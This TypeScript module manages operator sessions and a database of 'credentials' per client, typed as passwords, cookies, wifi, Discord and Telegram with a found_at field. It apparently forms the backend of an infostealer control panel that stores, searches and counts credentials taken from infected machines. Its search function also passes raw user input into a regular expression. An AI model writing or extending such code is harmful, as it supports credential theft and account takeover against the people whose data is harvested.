import { getDatabase } from './db'
import { v4 as uuidv4 } from 'uuid'

export interface Session {
  id: string
  username: string
  login_time: string
  last_activity: string
  ip_address?: string
  user_agent?: string
  is_active: boolean
}

export interface Credential {
  id: string
  client_id: string
  credential_type: string
  username?: string
  password?: string
  domain?: string
  application?: string
  found_at?: string
  created_at: string
}

export async function createSession(username: string, ipAddress?: string, userAgent?: string): Promise<Session> {
  const db = await getDatabase()
  const id = uuidv4()
  const now = new Date().toISOString()

  const session: Session = {
    id,
    username,
    login_time: now,
    last_activity: now,
    ip_address: ipAddress || undefined,
    user_agent: userAgent || undefined,
    is_active: true
  }

  await db.collection('sessions').insertOne(session)
  return session
}

export async function getSession(id: string): Promise<Session | null> {
  const db = await getDatabase()
  const row = await db.collection('sessions').findOne({ id }) as any
  
  if (!row) return null
  return formatSession(row)
}

export async function getActiveSessions(): Promise<Session[]> {
  const db = await getDatabase()
  const rows = await db.collection('sessions')
    .find({ is_active: true })
    .sort({ last_activity: -1 })
    .toArray() as any[]
  
  return rows.map(formatSession)
}

export async function updateSessionActivity(id: string): Promise<void> {
  const db = await getDatabase()
  const now = new Date().toISOString()
  
  await db.collection('sessions').updateOne(
    { id },
    { $set: { last_activity: now } }
  )
}

export async function endSession(id: string): Promise<boolean> {
  const db = await getDatabase()
  const result = await db.collection('sessions').updateOne(
    { id },
    { $set: { is_active: false } }
  )
  
  return (result.modifiedCount ?? 0) > 0
}

export async function endAllSessions(): Promise<number> {
  const db = await getDatabase()
  const result = await db.collection('sessions').updateMany(
    { is_active: true },
    { $set: { is_active: false } }
  )
  
  return result.modifiedCount ?? 0
}

export async function getSessionStats(): Promise<{
  active: number
  total: number
}> {
  const db = await getDatabase()
  
  const active = await db.collection('sessions').countDocuments({ is_active: true })
  const total = await db.collection('sessions').countDocuments()
  
  return { active, total }
}

// Credentials functions

export async function recordCredential(input: {
  client_id: string
  credential_type: string
  username?: string
  password?: string
  domain?: string
  application?: string
  found_at?: string
}): Promise<Credential> {
  const db = await getDatabase()
  const id = uuidv4()
  const now = new Date().toISOString()

  const cred: Credential = {
    id,
    client_id: input.client_id,
    credential_type: input.credential_type,
    username: input.username || undefined,
    password: input.password || undefined,
    domain: input.domain || undefined,
    application: input.application || undefined,
    found_at: input.found_at || undefined,
    created_at: now
  }

  await db.collection('credentials').insertOne(cred)
  return cred
}

export async function getCredential(id: string): Promise<Credential | null> {
  const db = await getDatabase()
  const row = await db.collection('credentials').findOne({ id }) as any
  
  if (!row) return null
  return formatCredential(row)
}

export async function getClientCredentials(clientId: string, limit = 100): Promise<Credential[]> {
  const db = await getDatabase()
  const rows = await db.collection('credentials')
    .find({ client_id: clientId })
    .sort({ created_at: -1 })
    .limit(limit)
    .toArray() as any[]
  
  return rows.map(formatCredential)
}

export async function getCredentialsByType(clientId: string, type: string): Promise<Credential[]> {
  const db = await getDatabase()
  const rows = await db.collection('credentials')
    .find({ client_id: clientId, credential_type: type })
    .sort({ created_at: -1 })
    .toArray() as any[]
  
  return rows.map(formatCredential)
}

export async function searchCredentials(clientId: string, query: string, limit = 50): Promise<Credential[]> {
  const db = await getDatabase()
  const regex = new RegExp(query, 'i')
  
  const rows = await db.collection('credentials').find({
    client_id: clientId,
    $or: [
      { username: regex },
      { domain: regex },
      { application: regex }
    ]
  }).sort({ created_at: -1 }).limit(limit).toArray() as any[]
  
  return rows.map(formatCredential)
}

export async function deleteCredential(id: string): Promise<boolean> {
  const db = await getDatabase()
  const result = await db.collection('credentials').deleteOne({ id })
  return (result.deletedCount ?? 0) > 0
}

export async function getCredentialStats(clientId: string): Promise<{
  total: number
  passwords: number
  cookies: number
  wifi: number
  discord: number
  telegram: number
}> {
  const db = await getDatabase()
  
  const total = await db.collection('credentials').countDocuments({ client_id: clientId })
  const passwords = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'passwords' })
  const cookies = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'cookies' })
  const wifi = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'wifi' })
  const discord = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'discord' })
  const telegram = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'telegram' })
  
  return { total, passwords, cookies, wifi, discord, telegram }
}

export async function deleteOldCredentials(daysOld = 90): Promise<number> {
  const db = await getDatabase()
  const dateLimit = new Date();
  dateLimit.setDate(dateLimit.getDate() - daysOld);

  const result = await db.collection('credentials').deleteMany({
    created_at: { $lt: dateLimit.toISOString() }
  })
  return result.deletedCount ?? 0
}

function formatSession(row: any): Session {
  return {
    id: row.id,
    username: row.username,
    login_time: row.login_time,
    last_activity: row.last_activity,
    ip_address: row.ip_address,
    user_agent: row.user_agent,
    is_active: Boolean(row.is_active),
  }
}

function formatCredential(row: any): Credential {
  return {
    id: row.id,
    client_id: row.client_id,
    credential_type: row.credential_type,
    username: row.username,
    password: row.password,
    domain: row.domain,
    application: row.application,
    found_at: row.found_at,
    created_at: row.created_at,
  }
}
